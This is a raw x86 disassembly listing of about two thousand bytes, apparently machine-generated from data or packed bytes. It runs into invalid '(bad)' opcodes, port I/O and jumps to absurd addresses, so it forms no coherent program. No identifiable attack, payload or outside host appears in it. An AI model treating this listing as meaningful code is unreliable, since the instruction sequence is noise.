  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	cli    
  4060e3:	sub    esp,edx
  4060e5:	addr16 jno 0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	inc    edi
  4060ef:	out    0xf2,al
  4060f1:	cmp    DWORD PTR [ecx-0x9788314],0xe630dfd1
  4060fb:	sub    bh,BYTE PTR [ebp-0x67]
  4060fe:	mov    edi,0x99579a34
  406103:	outs   dx,DWORD PTR ds:[esi]
  406104:	or     al,0x2d
  406106:	push   ds
  406107:	add    BYTE PTR [esi],dl
  406109:	push   0x47
  40610b:	ror    DWORD PTR [ebp+0x73],0xad
  40610f:	and    BYTE PTR [esi+0x78],ah
  406112:	push   0xfbf454b
  406117:	fbld   TBYTE PTR [edi-0x1344f1ae]
  40611d:	cmp    esp,DWORD PTR [ebp-0x49dbe00]
  406123:	enter  0x7af,0x85
  406127:	mov    al,BYTE PTR [ebx-0x16]
  40612a:	lds    eax,FWORD PTR [eax-0x6]
  40612d:	mov    ebx,0x967fd856
  406132:	sub    bh,bh
  406134:	ret    
  406135:	cvtps2pi mm7,xmm7
  406138:	inc    ebp
  406139:	mov    ax,0x5e5
  40613d:	push   ecx
  40613e:	jmp    0xd2dadeb4
  406143:	in     eax,dx
  406144:	iret   
  406145:	test   al,ch
  406147:	shl    DWORD PTR [esi-0x53],0x74
  40614b:	dec    edi
  40614c:	push   ebx
  40614d:	dec    edi
  40614e:	xchg   ecx,eax
  40614f:	adc    BYTE PTR [esi],cl
  406151:	push   ebx
  406152:	lea    eax,[eax+0x28]
  406155:	into   
  406156:	rol    DWORD PTR [edi-0x17],1
  406159:	fs mov ebx,0x34d5f7a1
  40615f:	ins    DWORD PTR es:[edi],dx
  406160:	ins    DWORD PTR es:[edi],dx
  406161:	dec    esi
  406162:	sbb    al,0x3a
  406164:	inc    ecx
  406165:	add    al,0xd2
  406167:	or     al,0x6b
  406169:	in     al,dx
  40616a:	mov    al,ds:0xec23e9d3
  40616f:	scas   eax,DWORD PTR es:[edi]
  406170:	jae    0x406101
  406172:	fdivr  DWORD PTR [edx+0x25f1cd32]
  406178:	mov    dl,0xc3
  40617a:	pop    es
  40617b:	inc    edx
  40617c:	call   0xabf695a0
  406181:	ins    BYTE PTR es:[edi],dx
  406182:	ja     0x4061a4
  406184:	mov    dl,0x1b
  406186:	les    ebp,FWORD PTR [edi]
  406188:	dec    esp
  406189:	mov    bl,0x6e
  40618b:	std    
  40618c:	(bad)  
  40618e:	push   0x44e48026
  406193:	sbb    eax,0x6264aed
  406198:	or     BYTE PTR [edi],al
  40619a:	jb     0x40613c
  40619c:	in     al,dx
  40619d:	push   es
  40619e:	mov    ebx,0x99f89b69
  4061a3:	lea    ebp,[ecx-0x4d]
  4061a6:	cs dec edi
  4061a8:	xchg   ecx,eax
  4061a9:	mov    cl,BYTE PTR [ebx+0x12]
  4061ac:	mov    cl,0x81
  4061ae:	push   ecx
  4061af:	inc    bx
  4061b1:	and    ch,BYTE PTR [eax-0x1c]
  4061b4:	js     0x40620e
  4061b6:	adc    dl,ch
  4061b8:	and    eax,0x79cbd78
  4061bd:	out    dx,eax
  4061be:	dec    ebx
  4061bf:	push   ebx
  4061c0:	dec    ecx
  4061c1:	adc    DWORD PTR [edx],0xffffffee
  4061c4:	popf   
  4061c5:	arpl   WORD PTR [esi+0x23],ax
  4061c8:	mov    edi,0xfe16eee3
  4061cd:	into   
  4061ce:	pop    ecx
  4061cf:	leave  
  4061d0:	mov    ds:0xad655a6c,eax
  4061d5:	add    esi,DWORD PTR [ecx-0x1ab37925]
  4061db:	or     DWORD PTR [edx+edi*1],edx
  4061de:	out    0x46,eax
  4061e0:	add    esi,DWORD PTR [ebx]
  4061e2:	and    BYTE PTR [eax-0x54a04ebd],ch
  4061e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061e9:	and    al,0xa0
  4061eb:	out    0xf3,al
  4061ed:	jns    0x406176
  4061ef:	mov    ebp,0x28c12122
  4061f4:	rol    BYTE PTR [esi],cl
  4061f6:	xchg   ecx,eax
  4061f7:	into   
  4061f8:	int    0x12
  4061fa:	push   ds
  4061fb:	cmpps  xmm3,XMMWORD PTR [ecx-0x4da1aea2],0x84
  406203:	sbb    bh,BYTE PTR [esi-0x754f9da2]
  406209:	stos   DWORD PTR es:[edi],eax
  40620a:	fldcw  WORD PTR [ecx+0x59]
  40620d:	pop    eax
  40620e:	dec    ecx
  40620f:	xchg   edi,eax
  406210:	inc    edi
  406211:	es sti 
  406213:	mov    ecx,0xb4c2473e
  406218:	retf   0x3a8f
  40621b:	mov    bl,0xc5
  40621d:	out    dx,eax
  40621e:	bound  esi,QWORD PTR [esi+0x20]
  406221:	lock neg DWORD PTR [esi]
  406224:	and    eax,0xb920a75c
  406229:	clc    
  40622a:	out    dx,eax
  40622b:	mov    bl,0x41
  40622d:	test   DWORD PTR [esi+eiz*4],esp
  406230:	cmp    DWORD PTR [eax-0x6065a233],0x29
  406237:	push   esp
  406238:	in     al,dx
  406239:	mov    ds:0x21f053aa,eax
  40623e:	jl     0x4061e1
  406240:	daa    
  406241:	mov    ecx,0x2ea21b3
  406246:	lahf   
  406247:	and    DWORD PTR [esi+0x16],edi
  40624a:	ins    DWORD PTR es:[edi],dx
  40624b:	push   edi
  40624c:	cmp    DWORD PTR [eax-0x668e3896],edx
  406252:	or     al,0x3b
  406254:	in     al,0xfd
  406256:	sub    edi,DWORD PTR [ebp+0x6c9bb572]
  40625c:	imul   edx,DWORD PTR [ebp-0x51],0x4f
  406260:	sar    DWORD PTR [edi],0x41
  406263:	mov    eax,ds:0xde3ca166
  406268:	leave  
  406269:	cmp    al,0xbe
  40626b:	xchg   edx,eax
  40626c:	rcl    BYTE PTR [ecx+0x363fd8c0],0x3f
  406273:	cmp    BYTE PTR [ebx+ebx*2-0x57],bl
  406277:	or     eax,ebx
  406279:	xlat   BYTE PTR ds:[ebx]
  40627a:	cmp    ah,BYTE PTR [esi-0x3ebf0bfd]
  406280:	xor    al,BYTE PTR [eax-0x23]
  406283:	lock xchg esp,eax
  406285:	es jge 0x4062f2
  406288:	jge    0x40624d
  40628a:	arpl   WORD PTR [edi-0x363c2b18],di
  406290:	pop    esp
  406291:	pop    esi
  406292:	push   0x31
  406294:	cmp    eax,0xe551fed8
  406299:	es jb  0x406267
  40629c:	dec    edi
  40629d:	add    BYTE PTR [ebx-0x1d],bh
  4062a0:	jmp    0x859a106e
  4062a5:	mov    edi,0x3f145096
  4062aa:	or     al,0x8d
  4062ac:	push   ebp
  4062ad:	adc    cl,cl
  4062af:	inc    eax
  4062b0:	lea    edx,[ebx-0x21c3a578]
  4062b6:	mov    es,WORD PTR [esi]
  4062b8:	xchg   bl,ah
  4062ba:	jo     0x406289
  4062bc:	(bad)  
  4062bd:	sti    
  4062be:	stos   DWORD PTR es:[edi],eax
  4062bf:	shl    DWORD PTR [eax-0x2e],cl
  4062c2:	mov    eax,ds:0x9c37974b
  4062c7:	iret   
  4062c8:	jg     0x4062c2
  4062ca:	arpl   ax,dx
  4062cc:	fist   DWORD PTR [ecx+0x2818e81b]
  4062d2:	and    ah,BYTE PTR [esi+edx*1]
  4062d5:	and    ecx,edx
  4062d7:	sar    DWORD PTR [edx],1
  4062d9:	inc    edi
  4062da:	fmul   st(6),st
  4062dc:	lods   eax,DWORD PTR ds:[esi]
  4062dd:	adc    eax,ecx
  4062df:	call   0x1cab028f
  4062e4:	in     eax,dx
  4062e5:	and    ah,BYTE PTR [ecx-0x5c26ea1c]
  4062eb:	inc    edi
  4062ec:	xchg   edx,eax
  4062ed:	dec    ebp
  4062ee:	mov    bh,0xf
  4062f0:	ror    BYTE PTR [edi-0x5653abb3],1
  4062f6:	cld    
  4062f7:	imul   ebx,DWORD PTR [edx+0x4],0x26e2094f
  4062fe:	mov    BYTE PTR [esi+ebx*2],dl
  406301:	jle    0x40635e
  406303:	mov    al,0x8d
  406305:	inc    ebp
  406306:	call   0x1939:0x11978ae7
  40630d:	pop    ds
  40630e:	in     al,0xf8
  406310:	sbb    DWORD PTR [ebx],0x83ea466e
  406316:	mov    bl,0xa4
  406318:	xchg   esi,eax
  406319:	pop    es
  40631a:	or     ch,BYTE PTR [ecx]
  40631c:	xchg   ebp,eax
  40631d:	push   ebp
  40631e:	lock in eax,0x51
  406321:	pop    es
  406322:	sbb    esp,DWORD PTR [edi-0x56f87c4b]
  406328:	xchg   DWORD PTR [esi],ecx
  40632a:	sbb    al,0xbd
  40632c:	scas   eax,DWORD PTR es:[edi]
  40632d:	xchg   ecx,eax
  40632e:	jge    0x40631f
  406330:	and    dh,BYTE PTR [ebx]
  406332:	rcl    BYTE PTR [eax],0x9e
  406335:	jno    0x4062c5
  406337:	rcl    BYTE PTR [ebx],1
  406339:	add    ch,bh
  40633b:	in     eax,0x67
  40633d:	ret    
  40633e:	(bad)  
  40633f:	mov    bh,0x33
  406341:	fiadd  WORD PTR [ecx-0x2d858215]
  406347:	call   0x9770ea95
  40634c:	sbb    DWORD PTR [esi],edx
  40634e:	and    ecx,DWORD PTR [ebx-0x44]
  406351:	(bad)  
  406352:	in     al,dx
  406353:	lods   eax,DWORD PTR ds:[esi]
  406354:	dec    edx
  406355:	xchg   esp,eax
  406356:	(bad)  
  406358:	mov    esi,0xd2cd4dfb
  40635d:	in     al,dx
  40635e:	cmc    
  40635f:	leave  
  406360:	mov    BYTE PTR [ebp+0x685939c],ah
  406366:	into   
  406367:	add    al,0xa2
  406369:	in     al,dx
  40636a:	imul   eax,DWORD PTR [ebx],0xffffffb8
  40636d:	(bad)  
  40636e:	repnz push ecx
  406370:	dec    edx
  406371:	hlt    
  406372:	mov    ebp,0x29860ba
  406377:	or     BYTE PTR [ecx+eiz*2+0x4ca895a],dl
  40637e:	sti    
  40637f:	sub    dh,dh
  406381:	mul    edi
  406383:	mov    edi,0x57e389ed
  406388:	mov    ?,WORD PTR [edx-0xab52694]
  40638e:	mov    ebp,0x90f3ef27
  406393:	fs sbb eax,esp
  406396:	aad    0xce
  406398:	jae    0x40634b
  40639a:	xchg   DWORD PTR [esp+eiz*8+0x4b],eax
  40639e:	leave  
  40639f:	jmp    0x40632d
  4063a1:	test   al,0xbb
  4063a3:	in     al,dx
  4063a4:	fimul  WORD PTR [eax]
  4063a6:	jg     0x406415
  4063a8:	scas   al,BYTE PTR es:[edi]
  4063a9:	xor    esi,DWORD PTR [eax+0x20]
  4063ac:	in     al,dx
  4063ad:	push   cs
  4063ae:	mov    al,0x25
  4063b0:	push   ss
  4063b1:	mov    dh,BYTE PTR [esi-0x6b]
  4063b4:	cmp    al,0x6e
  4063b6:	mov    dh,BYTE PTR [edi-0x43]
  4063b9:	cdq    
  4063ba:	shl    BYTE PTR [ebx-0xd],1
  4063bd:	(bad)  
  4063bf:	popf   
  4063c0:	stos   BYTE PTR es:[edi],al
  4063c1:	mov    ah,0xcc
  4063c3:	jge    0x406398
  4063c5:	pop    esp
  4063c6:	addr16 ja 0x40634d
  4063c9:	test   DWORD PTR [ecx],eax
  4063cb:	test   eax,0xbf6971fc
  4063d0:	sti    
  4063d1:	sti    
  4063d2:	xchg   esp,eax
  4063d3:	inc    dl
  4063d5:	nop
  4063d6:	mov    ds:0x380a6fbd,eax
  4063db:	and    al,0x67
  4063dd:	out    0x93,al
  4063df:	in     al,0x7d
  4063e1:	xor    edx,eax
  4063e3:	jns    0x4063fa
  4063e5:	lods   eax,DWORD PTR ds:[esi]
  4063e6:	mov    ch,0x55
  4063e8:	push   esi
  4063e9:	cmc    
  4063ea:	push   esp
  4063eb:	adc    al,0x77
  4063ed:	loope  0x40639d
  4063ef:	loopne 0x40645b
  4063f1:	adc    eax,0x1056961d
  4063f6:	push   ss
  4063f7:	mov    cl,0x68
  4063f9:	fmul   DWORD PTR [edi-0x7200933c]
  4063ff:	sub    bh,ch
  406401:	adc    dl,dl
  406403:	loop   0x40643a
  406405:	sbb    edi,esi
  406407:	(bad)  
  406408:	loope  0x40641e
  40640a:	inc    eax
  40640b:	popa   
  40640c:	and    al,0xc8
  40640e:	or     DWORD PTR [ecx-0x61],edx
  406411:	(bad)  
  406412:	mov    dh,0xe0
  406414:	(bad)  
  406417:	les    esp,FWORD PTR [ecx+0x72]
  40641a:	jno    0x40641b
  40641c:	ja     0x4063b6
  40641e:	xchg   esi,eax
  40641f:	xchg   ebp,eax
  406420:	adc    dl,0x55
  406423:	pop    eax
  406424:	pop    ebx
  406425:	dec    eax
  406426:	ja     0x4063a9
  406428:	call   0xaba33a24
  40642d:	loop   0x406433
  40642f:	inc    ebp
  406430:	lock icebp 
  406432:	neg    esi
  406434:	push   0xfffffffd
  406436:	retf   0xf5e9
  406439:	loope  0x406475
  40643b:	cmp    al,0x3c
  40643d:	jmp    0x4064bd
  40643f:	and    al,0xe2
  406441:	jge    0x406485
  406443:	aad    0xfa
  406445:	lahf   
  406446:	std    
  406447:	mov    eax,0x36133a99
  40644c:	mov    al,0x32
  40644e:	(bad)  {k3}
  406453:	idiv   DWORD PTR [edi-0x71]
  406456:	imul   esi,DWORD PTR [ecx-0x50805d14],0xffffffd6
  40645d:	imul   edx,DWORD PTR [esi],0xffffffbe
  406460:	stc    
  406461:	sbb    ebx,edi
  406463:	push   esp
  406464:	push   ds
  406465:	fs test eax,0xc7b37747
  40646b:	dec    ebx
  40646c:	add    BYTE PTR ds:0xeafba6a3,ch
  406472:	mov    edx,0xc9c930d3
  406477:	xor    DWORD PTR [esi-0x60316f2d],eax
  40647d:	pop    edi
  40647e:	fbld   TBYTE PTR [edx+0x58320604]
  406484:	xor    al,0xdb
  406486:	push   ecx
  406487:	ret    0xcd02
  40648a:	mov    ebp,0x8fe3cca2
  40648f:	jno    0x40646d
  406491:	fisttp DWORD PTR [esi-0x5c]
  406494:	pop    ebp
  406495:	sbb    ch,ah
  406497:	icebp  
  406498:	mov    esp,0x94b0fac5
  40649d:	fst    DWORD PTR [edi+0x35]
  4064a0:	dec    ebp
  4064a1:	jo     0x4064b0
  4064a3:	cmp    DWORD PTR [edi+0x56],ecx
  4064a6:	into   
  4064a7:	lods   eax,DWORD PTR ds:[esi]
  4064a8:	stc    
  4064a9:	scas   eax,DWORD PTR es:[edi]
  4064aa:	loop   0x4064bb
  4064ac:	dec    esp
  4064ad:	ins    DWORD PTR es:[edi],dx
  4064ae:	sbb    cl,al
  4064b0:	jns    0x4064de
  4064b2:	push   ecx
  4064b3:	loope  0x4064da
  4064b5:	sbb    edi,esi
  4064b7:	mov    edx,0xd5105c9b
  4064bc:	hlt    
  4064bd:	xor    dx,WORD PTR [ebp+0x1c]
  4064c1:	repnz fild QWORD PTR [eax+eiz*2+0x26]
  4064c6:	xor    eax,0x7a450cb8
  4064cb:	xadd   ebx,edx
  4064ce:	sub    BYTE PTR [esi+0x1],cl
  4064d1:	mov    edi,0x47a359e1
  4064d6:	add    eax,0x98060974
  4064db:	pop    ds
  4064dc:	xchg   ecx,eax
  4064dd:	stc    
  4064de:	mov    ds:0xdd073716,al
  4064e3:	add    DWORD PTR [ebx],ebp
  4064e5:	clc    
  4064e6:	jnp    0x40646b
  4064e8:	aaa    
  4064e9:	push   eax
  4064ea:	call   DWORD PTR [ecx-0x63f50efe]
  4064f0:	jo     0x406533
  4064f2:	arpl   WORD PTR [ebx+0x1ccd05dd],cx
  4064f8:	push   esp
  4064f9:	sub    al,0x6d
  4064fb:	out    dx,eax
  4064fc:	cdq    
  4064fd:	or     BYTE PTR [ecx+eiz*8+0x510680bc],bh
  406504:	iret   
  406505:	jg     0x40657e
  406507:	test   eax,0x786bbdad
  40650c:	and    DWORD PTR [esi],esp
  40650e:	and    al,0xcd
  406510:	jg     0x4064e1
  406512:	jmp    0x262c:0xc9d44698
  406519:	loope  0x4064ed
  40651b:	scas   al,BYTE PTR es:[edi]
  40651c:	mov    al,dl
  40651e:	ins    DWORD PTR es:[edi],dx
  40651f:	mov    ds:0xf837fe9e,al
  406524:	sbb    al,0x8e
  406526:	jmp    0x4c1ad1c0
  40652b:	mov    dl,0xfa
  40652d:	xchg   BYTE PTR [eax],ah
  40652f:	xchg   BYTE PTR [ecx],dh
  406531:	popa   
  406532:	dec    esi
  406533:	lds    ebx,FWORD PTR [edx-0x4d3fc0f6]
  406539:	push   ecx
  40653a:	lds    edx,FWORD PTR [edi-0x26]
  40653d:	sbb    DWORD PTR [eax],edx
  40653f:	inc    ecx
  406540:	repz add ebx,DWORD PTR [ecx+0x52]
  406544:	jb     0x406500
  406546:	xlat   BYTE PTR ds:[ebx]
  406547:	je     0x4064df
  406549:	xlat   BYTE PTR ds:[ebx]
  40654a:	jno    0x4065ba
  40654c:	mov    ds:0x7d857361,eax
  406551:	lock fsubr st(7),st
  406554:	jbe    0x4065c6
  406556:	xor    al,0x2a
  406558:	mov    eax,ds:0xd480cdb1
  40655d:	mov    edx,esp
  40655f:	in     al,0x6
  406561:	(bad)  
  406562:	stc    
  406563:	retf   0xef1c
  406566:	data16 rcr BYTE PTR [ecx-0x71c62ce8],cl
  40656d:	cmp    DWORD PTR [edx],ebp
  40656f:	fndisi(8087 only) 
  406571:	inc    edx
  406572:	(bad)  
  406573:	dec    eax
  406574:	ret    0xb5dd
  406577:	rcl    bl,0x58
  40657a:	sbb    ebx,edi
  40657c:	lock mov BYTE PTR [edi+0x75042d2d],ch
  406583:	or     esp,ecx
  406585:	add    ch,BYTE PTR [edi-0x53]
  406588:	jecxz  0x4065c4
  40658a:	in     eax,dx
  40658b:	mov    al,fs:0x12b26b95
  406591:	imul   edx,DWORD PTR [ecx+0x44],0x3
  406595:	mov    ds:0x10797dad,eax
  40659a:	div    esp
  40659c:	mov    dl,0x66
  40659e:	lahf   
  40659f:	xchg   ebp,eax
  4065a0:	sbb    DWORD PTR [ecx+0x64],ebp
  4065a3:	add    al,0xd8
  4065a5:	out    0xf3,eax
  4065a7:	in     al,0xf9
  4065a9:	cmp    bh,BYTE PTR [ecx+0x18]
  4065ac:	stos   DWORD PTR es:[edi],eax
  4065ad:	mov    al,ds:0xcafd5eea
  4065b2:	pop    esp
  4065b4:	fwait
  4065b5:	jge    0x406628
  4065b7:	inc    eax
  4065b8:	fidivr WORD PTR [ebx+0x20ed3b45]
  4065be:	addr16 sahf 
  4065c0:	dec    esp
  4065c1:	sub    BYTE PTR [eax-0x20bf6f70],cl
  4065c7:	adc    esp,DWORD PTR [ebp+0x584e9aae]
  4065cd:	(bad)  
  4065ce:	cld    
  4065cf:	jbe    0x4065cf
  4065d1:	aaa    
  4065d2:	int    0x79
  4065d4:	jp     0x40657d
  4065d6:	mov    edi,0x9b9dcacb
  4065db:	inc    DWORD PTR [ebp-0xf]
  4065de:	test   al,dl
  4065e0:	xchg   dl,dh
  4065e2:	mov    dh,al
  4065e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065e5:	cmp    DWORD PTR [esi],eax
  4065e7:	test   esi,ebp
  4065e9:	inc    esi
  4065ea:	(bad)  
  4065eb:	jo     0x406625
  4065ed:	push   cs
  4065ee:	bound  ebx,QWORD PTR [ecx+0x326c5812]
  4065f4:	push   0xffffff89
  4065f6:	js     0x406602
  4065f8:	nop
  4065f9:	xor    ebp,ebp
  4065fb:	push   es
  4065fc:	add    DWORD PTR [edi],ebx
  4065fe:	hlt    
  4065ff:	mov    BYTE PTR [ecx-0x7b],dl
  406602:	and    ecx,DWORD PTR [ecx-0x2e4cce87]
  406608:	ins    BYTE PTR es:[edi],dx
  406609:	xor    ah,ch
  40660b:	clc    
  40660c:	lds    edi,FWORD PTR [edi-0x7870bd27]
  406612:	mov    bl,0xb3
  406614:	or     eax,DWORD PTR [eax]
  406616:	mov    WORD PTR [esi+ecx*4+0x14c7b06f],?
  40661d:	stc    
  40661e:	imul   ebx,DWORD PTR [ebp-0x4fd1d94f],0xffffffac
  406625:	dec    eax
  406626:	mov    cl,0x98
  406628:	lods   eax,DWORD PTR ds:[esi]
  406629:	(bad)  
  40662a:	pusha  
  40662b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40662c:	test   al,0x6b
  40662e:	jnp    0x4065fa
  406630:	xchg   esi,eax
  406631:	or     cl,cl
  406633:	xor    al,0x7a
  406635:	stc    
  406636:	dec    ebx
  406637:	js     0x406653
  406639:	jmp    0x5f31ff48
  40663e:	mov    ds:0x45e0bea3,eax
  406643:	js     0x406615
  406645:	sub    DWORD PTR [edi],esp
  406647:	mov    dh,0xb2
  406649:	imul   al
  40664b:	mov    dh,0xa3
  40664d:	add    eax,0x1939e4e1
  406652:	xchg   edi,eax
  406653:	push   0x63
  406655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406656:	sub    eax,0xfe52a0e8
  40665b:	and    eax,0x34002e21
  406660:	stos   BYTE PTR es:[edi],al
  406661:	add    DWORD PTR [edx+0x22],ecx
  406664:	mul    edx
  406666:	sub    dh,BYTE PTR [ebp+0x6b]
  406669:	aas    
  40666a:	ins    DWORD PTR es:[edi],dx
  40666b:	xchg   DWORD PTR [edx+edi*2+0x7b6e07f],esp
  406672:	mov    ah,BYTE PTR [edx-0x53194dde]
  406678:	cwde   
  406679:	or     BYTE PTR [eax-0x350aa40f],al
  40667f:	mov    BYTE PTR [edi+0x52],dl
  406682:	inc    ebx
  406683:	mov    cl,al
  406685:	sahf   
  406686:	dec    ebp
  406687:	jne    0x4066aa
  406689:	push   ebp
  40668a:	inc    ebx
  40668b:	xchg   ecx,eax
  40668c:	call   0xfd8:0xc76fe53b
  406693:	arpl   WORD PTR [esi+0x24],bp
  406696:	fsub   DWORD PTR [ebx-0x7b]
  406699:	sbb    DWORD PTR [ecx+0x68],ebx
  40669c:	lahf   
  40669d:	aad    0x2
  40669f:	and    DWORD PTR [esi+0x6d],ebp
  4066a2:	fnstsw WORD PTR [ebx+0x3c]
  4066a5:	push   ebx
  4066a6:	addr16 pop ss
  4066a8:	fisubr WORD PTR [eax+eiz*1-0x490b12c]
  4066af:	frstor ds:0xeb46cb51
  4066b5:	mov    esp,0xf3d013d5
  4066ba:	dec    eax
  4066bb:	test   DWORD PTR [edi-0x30bf6d67],eax
  4066c1:	scas   eax,DWORD PTR es:[edi]
  4066c2:	pop    edi
  4066c3:	arpl   WORD PTR [esi],dx
  4066c5:	js     0x4066f4
  4066c7:	(bad)  
  4066c8:	outs   dx,DWORD PTR ds:[esi]
  4066c9:	inc    ebp
  4066ca:	in     al,0x4d
  4066cc:	test   ebx,ecx
  4066ce:	xchg   edi,eax
  4066cf:	pushf  
  4066d0:	rcl    DWORD PTR [esi+0x32],cl
  4066d3:	jecxz  0x40674a
  4066d5:	xchg   edx,eax
  4066d6:	add    al,0x9a
  4066d8:	mov    ch,0xbe
  4066da:	int3   
  4066db:	dec    edi
  4066dc:	adc    esi,DWORD PTR [edi+0x24]
  4066df:	pop    ecx
  4066e0:	rcr    edx,1
  4066e2:	mov    ecx,ss
  4066e4:	dec    ebx
  4066e5:	jmp    0xa242:0xa4cef978
  4066ec:	jnp    0x40675d
  4066ee:	cmp    DWORD PTR [edx],0x6c
  4066f1:	push   ds
  4066f2:	stc    
  4066f3:	jb     0x40674f
  4066f5:	push   ecx
  4066f6:	xchg   ebp,eax
  4066f7:	mov    al,0xb7
  4066f9:	dec    eax
  4066fa:	xchg   BYTE PTR [ecx-0x51],ch
  4066fd:	mov    DWORD PTR [ebx],ebx
  4066ff:	icebp  
  406700:	in     eax,0xe4
  406702:	cld    
  406703:	pop    esp
  406704:	sub    BYTE PTR [esi],al
  406706:	or     BYTE PTR [edx],bh
  406708:	sahf   
  406709:	add    esi,DWORD PTR [esi]
  40670b:	push   edx
  40670c:	retf   0xb2d9
  40670f:	xchg   esi,eax
  406710:	sbb    eax,0x212a1c21
  406715:	mov    DWORD PTR fs:[edi+edi*8],esp
  406719:	mov    dh,0x86
  40671b:	or     edx,esi
  40671d:	daa    
  40671e:	adc    al,0x79
  406720:	mov    bh,0xa9
  406722:	(bad)  
  406723:	retf   
  406724:	je     0x4066ba
  406726:	and    bh,BYTE PTR [edx+0x66]
  406729:	or     eax,0xb6da6ada
  40672e:	inc    ecx
  40672f:	sbb    eax,0x124adb43
  406734:	push   ds
  406735:	cmp    al,0x48
  406737:	jmp    0x35065e01
  40673c:	int    0x7
  40673e:	shl    dh,0x94
  406741:	ss ins DWORD PTR es:[edi],dx
  406743:	mov    ebp,0x21495542
  406748:	and    bh,BYTE PTR [ebx-0x22]
  40674b:	popf   
  40674c:	sub    DWORD PTR [ecx],edx
  40674e:	in     eax,0xe8
  406750:	cmp    eax,0x70c6547b
  406755:	data16 jp 0x406702
  406758:	push   ss
  406759:	aam    0xa3
  40675b:	sti    
  40675c:	sub    al,0x38
  40675e:	test   DWORD PTR [ebx-0x483c365d],0x12eef7a6
  406768:	out    0x3e,eax
  40676a:	xchg   edi,eax
  40676b:	mov    ch,0x27
  40676d:	dec    ebp
  40676e:	sbb    BYTE PTR [ebx+0x71],0x81
  406772:	je     0x406736
  406774:	dec    ebp
  406775:	test   al,0x22
  406777:	clc    
  406778:	mov    eax,edi
  40677a:	clc    
  40677b:	enter  0x2197,0x16
  40677f:	dec    edi
  406780:	neg    DWORD PTR [eax]
  406782:	imul   esi,edx,0x669b388d
  406788:	pusha  
  406789:	arpl   WORD PTR [edi+0x16d459fc],si
  40678f:	cmp    di,0xffc5
  406793:	mov    BYTE PTR ds:0x71abae6c,dh
  406799:	and    bh,BYTE PTR ds:0x32f1e75e
  40679f:	sub    eax,0x36648405
  4067a4:	daa    
  4067a5:	push   ss
  4067a6:	and    cl,dh
  4067a8:	outs   dx,BYTE PTR ds:[esi]
  4067a9:	mov    al,ds:0xef4646c5
  4067ae:	xor    eax,0xdb074761
  4067b3:	sub    DWORD PTR [edi+0x1],eax
  4067b6:	je     0x406795
  4067b8:	out    dx,al
  4067b9:	data16 fsub DWORD PTR [ebx]
  4067bc:	xor    eax,0xab31c729
  4067c1:	mov    ebx,0x7ffba48f
  4067c6:	int3   
  4067c7:	mov    dl,0xe2
  4067c9:	jmp    0x1b74:0x9e0e7d74
  4067d0:	xchg   edx,eax
  4067d1:	and    eax,0xa0ead841
  4067d6:	dec    esi
  4067d7:	fnstsw WORD PTR [ecx]
  4067d9:	ficom  WORD PTR [eax-0x5e06fb0b]
  4067df:	inc    eax
  4067e0:	jae    0x4067bc
  4067e2:	mov    fs,WORD PTR [edx+0x28032c3a]
  4067e8:	enter  0x746d,0xf6
  4067ec:	fstp   QWORD PTR ds:0x6cfbc216
  4067f2:	js     0x4067e6
  4067f4:	mov    bl,0x53
  4067f6:	jo     0x406807
  4067f8:	pop    eax
  4067f9:	mov    ebp,0xd3a68d04
  4067fe:	in     eax,0x28
  406800:	imul   eax,esp,0x39
  406803:	outs   dx,BYTE PTR ds:[esi]
  406804:	mov    esi,0x3f7e075b
  406809:	scas   eax,DWORD PTR es:[edi]
  40680a:	mov    DWORD PTR [esi+0x2c],eax
  40680d:	pop    es
  40680e:	add    eax,0x6bc4e9ed
  406813:	out    0xd7,eax
  406815:	aaa    
  406816:	out    0xde,al
  406818:	pop    DWORD PTR [esi-0x73]
  40681b:	sbb    al,ah
  40681d:	dec    BYTE PTR [ebp+0x6ffb8884]
  406823:	retfw  0x5a84
  406827:	push   es
  406828:	mov    ds:0xd2acacfc,eax
  40682d:	test   al,0x92
  40682f:	fst    DWORD PTR [eax]
  406831:	push   edi
  406832:	and    DWORD PTR [edi+0x2e],ebx
  406835:	in     al,dx
  406836:	fnstenv [ebp-0x48f6ce]
  40683c:	or     BYTE PTR [ebp+edi*8-0x3c],ch
  406840:	adc    DWORD PTR [ebp+ecx*8+0x3c4af90b],ebx
  406847:	ins    BYTE PTR es:[edi],dx
  406848:	push   ebp
  406849:	test   al,0x83
  40684b:	mov    DWORD PTR [edx+eax*1-0xe],ebp
  40684f:	std    
  406850:	ja     0x406823
  406852:	pop    ebp
  406853:	pop    eax
  406854:	call   0x448c17b2
  406859:	(bad)  
  40685a:	rcr    al,cl
  40685c:	dec    eax
  40685d:	ins    BYTE PTR es:[edi],dx
  40685e:	aam    0x2b
  406860:	mov    eax,ds:0x5b5f33ac
  406865:	sbb    BYTE PTR [esi+0x3a1e3715],0xde
  40686c:	call   0xb72de009
  406871:	sti    
  406872:	inc    edi
  406873:	pusha  
  406874:	add    DWORD PTR [ecx+ebx*1],ebp
  406877:	scas   eax,DWORD PTR es:[edi]
  406878:	lahf   
  406879:	in     al,0xb2
  40687b:	outs   dx,DWORD PTR ds:[esi]
  40687c:	je     0x406881
  40687e:	sub    eax,0x574581a1
  406883:	out    0x6,al
  406885:	aad    0x72
  406887:	pop    ds
  406888:	daa    
  406889:	aas    
  40688a:	dec    esp
  40688b:	sbb    al,0x54
  40688d:	enter  0x1c06,0x6
  406891:	inc    esi
  406892:	cmp    BYTE PTR [edi],ch
  406894:	adc    DWORD PTR [ebx],ecx
  406896:	xor    bl,BYTE PTR [edi+0x6a]
  406899:	fnsave es:[edx-0x62c1209f]
  4068a0:	out    dx,al
  4068a1:	and    al,0x62
  4068a3:	in     al,0x1f
  4068a5:	hlt    
  4068a6:	test   esi,ebx
  4068a8:	out    dx,eax
  4068a9:	scas   al,BYTE PTR es:[edi]
  4068aa:	lahf   
  4068ab:	xor    eax,DWORD PTR [esi-0x50]
